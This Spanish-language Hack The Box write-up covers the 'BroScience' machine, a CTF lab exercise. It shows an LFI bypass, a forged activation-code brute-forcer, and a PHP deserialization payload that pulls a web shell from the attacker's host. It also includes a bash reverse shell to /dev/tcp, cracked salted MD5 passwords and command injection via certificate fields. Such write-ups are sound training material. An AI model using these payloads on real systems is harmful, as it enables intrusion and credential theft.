---
layout: single
title: HTB - BroScience writeup
date: 2023-01-01
classes: wide
header:
  teaser: /assets/images/HackTheBox/BroScience/broscience.png
  teaser_home_page: true
categories:
  - HackTheBox  
  - medium
tags:
  - LFI
  - code analysis
  - Upload File
  - PHP Object Injection
  - Craking
---

![](/assets/images/HackTheBox/BroScience/broscience.png)

En esta máquina Aprenderemos técnicas de bypassing para conseguir LFI _(Local File Inclusion)_ y así poder ver cómo esta construida la página y entender un poco cómo funciona gracias al analisis del codigo en PHP.
Nos aprobecharemos de unas funciones vulnerables como **\_\_constructor** y **\_\_wakeup** para poder subir un archivo _.php_ y ejecutar comandos consiguiendo ganar acceso a la máquina.
Pivotaremos a un usuario conectandonos a una base de datos postgreSQL interna consiguiendo hashes (con salt) y crackeandolos.
Finalmente inspeccionaremos un script en bash que lo ejecuta root _root_ para escalar privilegios.

## índice
* [Nmap, Fuzzing y Reconocimiento](#nmap-fuzzing-y-reconocimiento)
* [Local File Inclusion (LFI)](#local-file-inclusion-lfi)
* [Registrando y activando usuario](#registrando-y-activando-usuario)
* [PHP Object Injection subiendo archivo PHP (RCE)](#php-object-injection-subiendo-archivo-php-rce)
* [Conectandote a base de datos PostgresSQL y obteniendo hashes](#conectandote-a-base-de-datos-postgressql-y-obteniendo-hashes)
* [Craking con Salt](#craking-con-salt)
* [Entendiendo Script en BASH](#entendiendo-script-en-bash)
* [Generando certificado para escalar privilegios](#generando-certificado-para-escalar-privilegios)

## Nmap, Fuzzing y Reconocimiento
Nuestro primer objetivo es descubrir cuantos puertos abiertos tiene la máquina.

`nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.195 -oG puertos.txt`


```
puertos.txt

# Nmap 7.92 scan initiated Wed Jan 25 12:47:05 2023 as: nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG nmap/allPorts 10.10.11.195
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.11.195 ()	Status: Up
Host: 10.10.11.195 ()	Ports: 22/open/tcp//ssh///, 80/open/tcp//http///, 443/open/tcp//https///
# Nmap done at Wed Jan 25 12:47:25 2023 -- 1 IP address (1 host up) scanned in 20.13 seconds
```
Lo siguiente que tenemos que hacer es detectar la versión y servicios que corren para cada uno de los puertos que estan abiertos.

`nmap -p22,80,443 -sVC 10.10.11.195 -oN versiones_servicios.txt`

```
versiones_servicios.txt

# Nmap 7.92 scan initiated Wed Jan 25 12:47:48 2023 as: nmap -p22,80,443 -sVC -oN nmap/targeted 10.10.11.195
Nmap scan report for 10.10.11.195 (10.10.11.195)
Host is up (0.28s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 df:17:c6:ba:b1:82:22:d9:1d:b5:eb:ff:5d:3d:2c:b7 (RSA)
|   256 3f:8a:56:f8:95:8f:ae:af:e3:ae:7e:b8:80:f6:79:d2 (ECDSA)
|_  256 3c:65:75:27:4a:e2:ef:93:91:37:4c:fd:d9:d4:63:41 (ED25519)
80/tcp  open  http     Apache httpd 2.4.54
|_http-server-header: Apache/2.4.54 (Debian)
|_http-title: Did not follow redirect to https://broscience.htb/
443/tcp open  ssl/http Apache httpd 2.4.54 ((Debian))
|_http-title: BroScience : Home
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=broscience.htb/organizationName=BroScience/countryName=AT
| Not valid before: 2022-07-14T19:48:36
|_Not valid after:  2023-07-14T19:48:36
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.54 (Debian)
|_ssl-date: TLS randomness does not represent time
Service Info: Host: broscience.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jan 25 12:48:18 2023 -- 1 IP address (1 host up) scanned in 30.19 seconds
```

Cuando utilizamos `whatweb http://10.10.11.195` vemos que la pagina nos redirije a **https://broscience.htb**. Para que podamos ver la pagina tendremos que añadir una linea en el archivo **/etc/hosts**.

![](/assets/images/HackTheBox/BroScience/whatweb-1.png)

```
/etc/hosts

# Host addresses
127.0.0.1  localhost
127.0.1.1  parrot
::1        localhost ip6-localhost ip6-loopback
ff02::1    ip6-allnodes
ff02::2    ip6-allrouters
# Others

10.10.11.195	broscience.htb
```

![](/assets/images/HackTheBox/BroScience/whatweb-2.png)

Antes de empezar con wfuzz, gobuster, etc... me gusta utilizar siempre el script que tiene incorporado nmap escrito en lua para hacer un pequeño fuzzing, hay que tener encuenta que solo prueba pocas rutas, pero nos sirve para empezar.

`nmap -p443 --script http-enum 10.10.11.195 -oN dirs.txt`

```
dirs.txt

# Nmap 7.92 scan initiated Wed Jan 25 12:49:16 2023 as: nmap -p443 --script http-enum -oN nmap/webScan 10.10.11.195
Nmap scan report for broscience.htb (10.10.11.195)
Host is up (0.043s latency).

PORT    STATE SERVICE
443/tcp open  https
| http-enum: 
|   /login.php: Possible admin folder
|   /user.php: Possible admin folder
|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.54 (debian)'
|   /includes/: Potentially interesting directory w/ listing on 'apache/2.4.54 (debian)'
|   /manual/: Potentially interesting folder
|_  /styles/: Potentially interesting directory w/ listing on 'apache/2.4.54 (debian)'

# Nmap done at Wed Jan 25 12:49:59 2023 -- 1 IP address (1 host up) scanned in 43.80 seconds
```

Podemos ver que hay tanto carpetas como archivos interesantes, vamos a echarles un vistazo.

## Local File Inclusion (LFI)

> Página principal

![](/assets/images/HackTheBox/BroScience/PaginaPrincipal.png)

Si inspeccionamos el codigo de la pagina principal podemos ver algo que nos llama la atención, las imagenes están siendo cargadas de la siguiente forma **scr="includes/img.php?path=bench.png"**.

![](/assets/images/HackTheBox/BroScience/htmlCode.png)

Tras mucho tiempo intentando conseguir un LFI lo consegui utilizando URL encoding _(img.php?path=..%252fincludes/img.php)_ y interceptando la respuesta con burpsuite.

* % -> %25
* / -> %2f 

![](/assets/images/HackTheBox/BroScience/DoIntercept.png)

> img.php

![](/assets/images/HackTheBox/BroScience/LFI.png)

Al interceptar la respuesta de la petición podemos ver todo el código en PHP _(img.php)_, gracias a esto podemos ver que está definiendo una variable **$badwords** para intentar evitar un LFI y también vemos dónde esta mondata la web **/var/www/html**.
<br>
Pensé que sería bueno descargarme todos los archivos **PHP** de la página:

```bash
curl -k -s -X GET 'https://broscience.htb/includes/img.php?path=..%252f..%252f..%252f..%252f/var/www/html/register.php' -o register.php
```

## Registrando y activando usuario

Cuando intentamos crear un usuario en la página, nos dice que miremos nuestro e-mail para activar la cuenta y poder iniciar sesión con nuestro usuario, pero pero el problema es que esta máquina no puede enviar correos.

![](/assets/images/HackTheBox/BroScience/register.png)

Si recordamos, en el paso anterior tubimos acceso a todos los archivos PHP de la página, vamos a inspeccionar **register.php**.

> register.php

![](/assets/images/HackTheBox/BroScience/activationLink.png)

Ya tenemos el link de activación pero, ¿cúal es el código de activación? La respuesta está en los demás archivos PHP. Buscando un poco, dentro del directorio includes podemos ver el archivo utils.php, el cual tiene una función **generate_activation_code()** que devuelve una _string_ de 32 caracteres.

> includes/utils.php

![](/assets/images/HackTheBox/BroScience/activationCode.png)

Ya tenemos todo para registrar y activar un usuario. Yo he creado un archivo PHP el cual me genera el link de activación.

> actCode.php

```php
<?php
function generate_activation_code() {
    $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
    srand(time());
    $activation_code = "";
    for ($i = 0; $i < 32; $i++) {
        $activation_code = $activation_code . $chars[rand(0, strlen($chars) - 1)];
    }
    return $activation_code;
}

echo "https://broscience.htb/activate.php?code=" . generate_activation_code();
```

```
$ php actCode.php;echo
https://broscience.htb/activate.php?code=BovTnt8YAmXeGeuivQpLCQUGkyGBVNqf
```

Ahora creamos un script en BASH que nos haga fuerza bruta y nos active el usuario.

```bash
#!/bin/bash

# CTRL + C
function ctrl_c(){
    echo -e "\n\n[!] Saliendo..\n"
    exit 1
}
trap ctrl_c SIGINT

# username=ch3chu&email=ch3chu%40ch3chu.github.io&password=ch3chu&password-confirm=ch3chu

urlReg='https://broscience.htb/register.php'
username='ch3chu'   # Change me
email='ch3chu@ch3chu.github.io' # Change me
password='ch3chu'   # Change me
passwordC='ch3chu'  # Change me

c=$(curl -s -k -X POST $urlReg -d "username=$username&email=$email&password=$password&password-confirm=$passwordC" | html2text | grep -i 'Account created')

if [[ $c ]]; then
    echo $c
else
    echo -e '[!] Cuenta ya creada o algo a salido mal.\n'
fi

a='Invalid activation code'

while [[ $a ]]; do
    url=$(php actCode.php)
    a=$(curl -s -k X GET "$url" | grep -i 'Invalid activation code')
done

echo -e "[+] Cuenta creada\n"
```

## PHP Object Injection subiendo archivo PHP (RCE)

Una vez logeado me dí cuenta que tenía una cookie **user-prefs** con un valor en base64.

![](/assets/images/HackTheBox/BroScience/cookie.png)

```
$ echo Tzo5OiJVc2VyUHJlZnMiOjE6e3M6NToidGhlbWUiO3M6NToibGlnaHQiO30= | base64 -d; echo
O:9:"UserPrefs":1:{s:5:"theme";s:5:"light";}
```

Parece que la cookie tiene data serializada en PHP, vamos a ver el código.

> includes/utils.php

![](/assets/images/HackTheBox/BroScience/OJIcode.png)

Al ver las funciones **\_\_construct()** y **\_\_wakeup()** pensé en [PHP Object Injection](https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection). La vulnerabilidad es causada por el uso de la función **unserialize()** en la línea `setcookie('user-prefs',base64_encode(serialize(new UserPrefs($val))));`. Esta función deserializa un string en un objeto, lo que permite a un atacante crear un objeto personalizado y controlar los métodos que se llaman en ese objeto.Para explotar esta vulnerabilidad, un atacante podría crear un objeto de la clase **AvatarInterface** con una propiedad **imgPath**
que apunte a un archivo crítico en el sistema, y una propiedad **tmp** que apunte a un archivo controlado por el atacante. El atacante luego podría serializar este objeto y codificarlo en base64, y enviarlo como el valor para la cookie **user-prefs**. Al deserializar la cookie, el objeto AvatarInterface se crearía y el método **save** se llamaría, lo que permitiría al atacante escribir en un archivo crítico en el sistema.
<br>
He hecho un script en PHP que te devuelve data serializada en base64 para subir un archivo php en el sistema.

> serializeData.php

```php
<?php
class Avatar {
    public $imgPath;

    public function __construct($imgPath) {
        $this->imgPath = $imgPath;
    }

    public function save($tmp) {
        $f = fopen($this->imgPath, "w");
        fwrite($f, file_get_contents($tmp));
        fclose($f);
    }
}

class AvatarInterface {
    public $tmp;
    public $imgPath; 

    public function __wakeup() {
        $a = new Avatar($this->imgPath);
        $a->save($this->tmp);
    }
}

$imgPath = '/var/www/html/ch3chu.php'; // Donde queremos copiar el archivo
$tmp = 'http://10.10.14.181:8081/rce.php'; // Archivo que vamos a copiar

$exploit = new AvatarInterface();
$exploit->imgPath = $imgPath;
$exploit->tmp = $tmp;

$serialized_exploit = serialize($exploit);
$base64_exploit = base64_encode($serialized_exploit);

echo $base64_exploit;
?>
```

> rce.php

```php
<?php
    echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';
?>
```

Ahora solo tendriamos que levantar un servidor web compartiendo el archivo **rce.php** `python3 -m http.server 8081`, pegar el valor de la cookie y recargar.

![](/assets/images/HackTheBox/BroScience/getHTTP.png)

Conseguimos RCE!

![](/assets/images/HackTheBox/BroScience/rce.png)

Reverse shell `ch3chu.php?cmd=bash -c "bash -i >%26 /dev/tcp/10.10.14.174/443 0>%261"`

![](/assets/images/HackTheBox/BroScience/reverseShell.png)

## Conectandote a base de datos PostgresSQL y obteniendo hashes

En el archivo **db_connect.php** encontramos credenciales expuestas de la base de datos. Hay que tener encuenta el **$db_salt** para poder crackear las contraseñas.

![](/assets/images/HackTheBox/BroScience/db.png)

Nos conectamos a la base de datos y sacamos usuarios y hashes.

```
$ psql -h localhost -U dbuser -d broscience -c "SELECT username,password FROM USERS"
Password for user dbuser: 
   username    |             password             
---------------+----------------------------------
 administrator | 15657792073e8a843d4f91fc403454e1
 bill          | 13edad4932da9dbb57d9cd15b66ed104
 michael       | bd3dad50e2d578ecba87d5fa15ca5f85
 john          | a7eed23a7be6fe0d765197b1027453fe
 dmytro        | 5d15340bded5b9395d5d14b9c21bc82b
 ch3chu        | 825bd06ae8a6c13b92b608fb492e30f3
 test          | a3ebb47679dc0438c5b703ffe885d857
 test1         | 16c3b0dd9dc67ec4831fcbc2a4e4f7a3
(8 rows)
```

## Craking con Salt

Antes de crackear los hashes necesitamos añadir el salt _(NaCl)_ al principio de cada linia del **rockyou.txt**.

```bash
sed 's/^/NaCl/g' /usr/share/wordlists/rockyou.txt > newrockyou.txt
```

```
$ john --wordlist=newrockyou.txt hashes --format=raw-md5
Using default input encoding: UTF-8
Loaded 5 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
NaCliluvhorsesandgym (bill)
NaClAaronthehottest (dmytro)
NaCl2applesplus2apples (michael)
3g 0:00:00:01 DONE (2023-01-29 21:35) 2.884g/s 13791Kp/s 13791Kc/s 57844KC/s NaCl 08 22 0128..NaCl*7¡Vamos!
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed
```

La contraseña de bill es `iluvhorsesandgym` quitándole el salt.

## Entendiendo Script en BASH

Enumerando el sistema nos damos cuenta que que en directorio /opt hay un script en BASH **renew_cert.sh**.

> renew_cert.sh

```bash
#!/bin/bash

if [ "$#" -ne 1 ] || [ $1 == "-h" ] || [ $1 == "--help" ] || [ $1 == "help" ]; then
    echo "Usage: $0 certificate.crt";
    exit 0;
fi

if [ -f $1 ]; then

    openssl x509 -in $1 -noout -checkend 86400 > /dev/null

    if [ $? -eq 0 ]; then
        echo "No need to renew yet.";
        exit 1;
    fi

    subject=$(openssl x509 -in $1 -noout -subject | cut -d "=" -f2-)

    country=$(echo $subject | grep -Eo 'C = .{2}')
    state=$(echo $subject | grep -Eo 'ST = .*,')
    locality=$(echo $subject | grep -Eo 'L = .*,')
    organization=$(echo $subject | grep -Eo 'O = .*,')
    organizationUnit=$(echo $subject | grep -Eo 'OU = .*,')
    commonName=$(echo $subject | grep -Eo 'CN = .*,?')
    emailAddress=$(openssl x509 -in $1 -noout -email)

    country=${country:4}
    state=$(echo ${state:5} | awk -F, '{print $1}')
    locality=$(echo ${locality:3} | awk -F, '{print $1}')
    organization=$(echo ${organization:4} | awk -F, '{print $1}')
    organizationUnit=$(echo ${organizationUnit:5} | awk -F, '{print $1}')
    commonName=$(echo ${commonName:5} | awk -F, '{print $1}')

    echo $subject;
    echo "";
    echo "Country     => $country";
    echo "State       => $state";
    echo "Locality    => $locality";
    echo "Org Name    => $organization";
    echo "Org Unit    => $organizationUnit";
    echo "Common Name => $commonName";
    echo "Email       => $emailAddress";

    echo -e "\nGenerating certificate...";
    openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout /tmp/temp.key -out /tmp/temp.crt -days 365 <<<"$country
    $state
    $locality
    $organization
    $organizationUnit
    $commonName
    $emailAddress
    " 2>/dev/null

    /bin/bash -c "mv /tmp/temp.crt /home/bill/Certs/$commonName.crt"
else
    echo "File doesn't exist"
    exit 1;
```

Este escript basicamente checkea si el certificado **broscience.crt** en el directorio /home/bill/Certs va a caducar en menos de un dia o no, si va a caducar te muestra por pantalla información del certificado y te crea uno nuevo, si no, no hace nada.
<br>
La parte crítica está en que tu puedes controlar la información del certificado, es decir, puedes poner en el certificado que tu organizacion es `$(whoami)` y a la hora de correr el programa se ejecutará el `whoami`.

## Generando certificado para escalar privilegios

Dentro del directorio Certs/ generaremos el certificado con el siguiente comando.

```bash
openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout ./broscience.key -out ./broscience.crt -days 1
```

Y añadiremos `$(touch /tmp/pwned.txt)` en todos los campos.

![](/assets/images/HackTheBox/BroScience/pwned.png)

![](/assets/images/HackTheBox/BroScience/pwned2.png)